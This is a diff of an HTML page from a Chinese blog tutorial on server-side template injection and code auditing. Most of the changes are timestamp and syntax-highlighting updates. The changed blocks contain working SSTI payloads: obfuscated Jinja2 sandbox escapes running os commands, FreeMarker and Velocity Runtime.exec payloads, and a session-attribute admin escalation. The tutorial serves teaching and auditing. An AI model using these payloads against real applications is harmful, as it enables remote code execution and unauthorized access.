@@ -9,14 +9,15 @@
 <meta name="author-link" content="http://shuai06.github.io">
 <meta name="description" content="简介 ssti（Server-SIde Template Injection，服务端模板注入），模板引擎支持使用静态模板文件，在运行时HTML页面中的实际值替换" /><meta name="keywords" content='SSTI, 服务端模板注入, 代码审计' /><meta itemprop="name" content="SSTI服务端模板注入">
 <meta itemprop="description" content="简介 ssti（Server-SIde Template Injection，服务端模板注入），模板引擎支持使用静态模板文件，在运行时HTML页面中的实际值替换"><meta itemprop="datePublished" content="2022-01-20T16:32:49+08:00" />
-<meta itemprop="dateModified" content="2023-07-20T12:07:19+00:00" />
+<meta itemprop="dateModified" content="2023-11-24T14:08:27+00:00" />
 <meta itemprop="wordCount" content="5036"><meta itemprop="image" content="https://shuai06.github.io/logo.png"/>
 <meta itemprop="keywords" content="SSTI,服务端模板注入,代码审计," /><meta property="og:title" content="SSTI服务端模板注入" />
 <meta property="og:description" content="简介 ssti（Server-SIde Template Injection，服务端模板注入），模板引擎支持使用静态模板文件，在运行时HTML页面中的实际值替换" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://shuai06.github.io/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" /><meta property="og:image" content="https://shuai06.github.io/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-01-20T16:32:49+08:00" />
-<meta property="article:modified_time" content="2023-07-20T12:07:19+00:00" />
+<meta property="article:modified_time" content="2023-11-24T14:08:27+00:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://shuai06.github.io/logo.png"/>
 
@@ -40,7 +41,7 @@
               "width":  1842 ,
               "height":  1036 
             }],"genre": "posts","keywords": "SSTI, 服务端模板注入, 代码审计","wordcount":  5036 ,
-    "url": "https:\/\/shuai06.github.io\/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5\/","datePublished": "2022-01-20T16:32:49+08:00","dateModified": "2023-07-20T12:07:19+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+    "url": "https:\/\/shuai06.github.io\/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5\/","datePublished": "2022-01-20T16:32:49+08:00","dateModified": "2023-11-24T14:08:27+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
       "@type": "Organization",
       "name": "剑胆琴心","logo": {
           "@type": "ImageObject",
@@ -673,13 +674,13 @@ request变量可以访问所有已发送的参数，因此我们可以request.ar
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls  /var/www/html&#34;).read()&#39; )
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="o">.</span><span class="n">values</span><span class="p">()[</span><span class="mi">13</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;ls  /var/www/html&#34;).read()&#39;</span> <span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">object.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)
+</span></span><span class="line"><span class="cl"><span class="n">object</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s1">&#39;o&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s1">&#39;sy&#39;</span><span class="o">+</span><span class="s1">&#39;stem&#39;</span><span class="p">](</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">{{request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60][&#39;__in&#39;+&#39;it__&#39;][&#39;__&#39;+&#39;glo&#39;+&#39;bal&#39;+&#39;s__&#39;][&#39;__bu&#39;+&#39;iltins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__im&#39;+&#39;port__(&#34;os&#34;).po&#39;+&#39;pen(&#34;ca&#34;+&#34;t a.php&#34;).re&#39;+&#39;ad()&#39;)}}
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">request</span><span class="p">[</span><span class="s1">&#39;__cl&#39;</span><span class="o">+</span><span class="s1">&#39;ass__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__base__</span><span class="p">[</span><span class="s1">&#39;__subcla&#39;</span><span class="o">+</span><span class="s1">&#39;sses__&#39;</span><span class="p">]()[</span><span class="mi">60</span><span class="p">][</span><span class="s1">&#39;__in&#39;</span><span class="o">+</span><span class="s1">&#39;it__&#39;</span><span class="p">][</span><span class="s1">&#39;__&#39;</span><span class="o">+</span><span class="s1">&#39;glo&#39;</span><span class="o">+</span><span class="s1">&#39;bal&#39;</span><span class="o">+</span><span class="s1">&#39;s__&#39;</span><span class="p">][</span><span class="s1">&#39;__bu&#39;</span><span class="o">+</span><span class="s1">&#39;iltins__&#39;</span><span class="p">][</span><span class="s1">&#39;ev&#39;</span><span class="o">+</span><span class="s1">&#39;al&#39;</span><span class="p">](</span><span class="s1">&#39;__im&#39;</span><span class="o">+</span><span class="s1">&#39;port__(&#34;os&#34;).po&#39;</span><span class="o">+</span><span class="s1">&#39;pen(&#34;ca&#34;+&#34;t a.php&#34;).re&#39;</span><span class="o">+</span><span class="s1">&#39;ad()&#39;</span><span class="p">)}}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以参考一下P师傅的 <a href="https://p0sec.net/index.php/archives/120/"target="_blank" rel="external nofollow noopener noreferrer">https://p0sec.net/index.php/archives/120/<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
@@ -710,8 +711,8 @@ request变量可以访问所有已发送的参数，因此我们可以request.ar
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span> <span class="n">value</span><span class="o">=</span><span class="s">&#34;freemarker.template.utility.Execute&#34;</span><span class="o">?</span><span class="k">new</span><span class="o">()&gt;</span><span class="n">$</span><span class="o">(</span><span class="n">value</span><span class="o">(</span><span class="s">&#34;calc.exe&#34;</span><span class="o">))&gt;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="s">&#34;freemarker.template.utility.Execute&#34;</span><span class="o">?</span><span class="k">new</span><span class="p">()</span><span class="o">&gt;</span><span class="n">$</span><span class="p">(</span><span class="n">value</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">))</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>freemarker.template.utility</code>包中三个类都可以被用来执行代码：</p>
 <ul>
@@ -729,10 +730,10 @@ request变量可以访问所有已发送的参数，因此我们可以request.ar
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span> <span class="n">classLoader</span><span class="o">=</span><span class="n">object</span><span class="o">?</span><span class="n">api</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">()&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">$</span><span class="o">(</span><span class="n">classLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">&#34;Evil.class&#34;</span><span class="o">))</span>
-</span></span><span class="line"><span class="cl">    
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">classLoader</span><span class="o">=</span><span class="n">object</span><span class="o">?</span><span class="n">api</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">()</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">$</span><span class="p">(</span><span class="n">classLoader</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="s">&#34;Evil.class&#34;</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>防御：</strong></p>
 <ul>
@@ -767,8 +768,8 @@ request变量可以访问所有已发送的参数，因此我们可以request.ar
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$e</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">).</span><span class="na">exec</span><span class="o">()</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$e</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">).</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">).</span><span class="na">exec</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>在使用Velovity模板注入中，如果无法进行名住，我们可以修改Cookie来进行权限升级：</p>
 <div class="highlight"><div class="chroma">
@@ -776,8 +777,8 @@ request变量可以访问所有已发送的参数，因此我们可以request.ar
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">&#34;IS_ADMIN&#34;</span><span class="o">,</span> <span class="s">&#34;1&#34;</span><span class="o">)</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$session</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&#34;IS_ADMIN&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1&#34;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>在漏洞不存在回显的时候，并且容器为Tomcat7的时候，可以通过如下方法来构造一个有回显的命令执行：</p>
 <div class="highlight"><div class="chroma">
@@ -794,17 +795,17 @@ request变量可以访问所有已发送的参数，因此我们可以request.ar
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">set</span><span class="o">(</span><span class="n">$str</span><span class="o">=</span><span class="n">$class</span><span class="o">.</span><span class="na">inspect</span><span class="o">(</span><span class="s">&#34;java.lang.String&#34;</span><span class="o">).</span><span class="na">type</span>
-</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">set</span><span class="o">(</span><span class="n">$cstr</span><span class="o">=</span><span class="n">$class</span><span class="o">.</span><span class="na">inspect</span><span class="o">(</span><span class="s">&#34;java.lang.Character&#34;</span><span class="o">).</span><span class="na">type</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">set</span><span class="o">(</span><span class="n">$ex</span><span class="o">=</span><span class="n">$class</span><span class="o">.</span><span class="na">inspect</span><span class="o">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="o">).</span><span class="na">type</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;whoami&#34;</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">$ex</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>     
-</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">set</span><span class="o">(</span><span class="n">$out</span><span class="o">=</span><span class="n">$ex</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">())</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">foreach</span><span class="o">(</span><span class="n">Si</span> <span class="n">in</span> <span class="o">[</span><span class="mf">1.</span><span class="o">.</span><span class="na">$out</span><span class="o">.</span><span class="na">available</span><span class="o">()])</span>
-</span></span><span class="line"><span class="cl"><span class="n">$str</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">$chr</span><span class="o">.</span><span class="na">toChars</span><span class="o">(</span><span class="n">$out</span><span class="o">.</span><span class="na">read</span><span class="o">()))</span>
-</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">end</span>     
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">set</span><span class="p">(</span><span class="n">$str</span><span class="o">=</span><span class="n">$class</span><span class="p">.</span><span class="na">inspect</span><span class="p">(</span><span class="s">&#34;java.lang.String&#34;</span><span class="p">).</span><span class="na">type</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">set</span><span class="p">(</span><span class="n">$cstr</span><span class="o">=</span><span class="n">$class</span><span class="p">.</span><span class="na">inspect</span><span class="p">(</span><span class="s">&#34;java.lang.Character&#34;</span><span class="p">).</span><span class="na">type</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">set</span><span class="p">(</span><span class="n">$ex</span><span class="o">=</span><span class="n">$class</span><span class="p">.</span><span class="na">inspect</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">).</span><span class="na">type</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;whoami&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">$ex</span><span class="p">.</span><span class="na">waitFor</span><span class="p">()</span><span class="w">     
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">set</span><span class="p">(</span><span class="n">$out</span><span class="o">=</span><span class="n">$ex</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">foreach</span><span class="p">(</span><span class="n">Si</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">[</span><span class="n">1</span><span class="p">..</span><span class="na">$out</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">]</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">$str</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">$chr</span><span class="p">.</span><span class="na">toChars</span><span class="p">(</span><span class="n">$out</span><span class="p">.</span><span class="na">read</span><span class="p">()))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">end</span><span class="w">     
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>代码审计的时候，搜索模板引擎的相关关键字即可</strong></p>
 <h2 id="漏洞防御">漏洞防御</h2>
@@ -821,7 +822,7 @@ request变量可以访问所有已发送的参数，因此我们可以request.ar
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
-        <span title=2023-07-20&#32;12:07:19>更新于 2023-07-20&nbsp;</span>
+        <span title=2023-11-24&#32;14:08:27>更新于 2023-11-24&nbsp;</span>
       </div><div class="post-info-license">
           <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
         </div></div>
@@ -846,7 +847,7 @@ request变量可以访问所有已发送的参数，因此我们可以request.ar
 <div id="comments"><div id="gitalk" class="comment"></div><noscript>
         Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk" rel="external nofollow noopener noreferrer">Gitalk</a>.
       </noscript></div></article></main><footer class="footer">
-    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.115.4">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.120.4">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
         </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
             <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
               <a href="http://shuai06.github.io"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
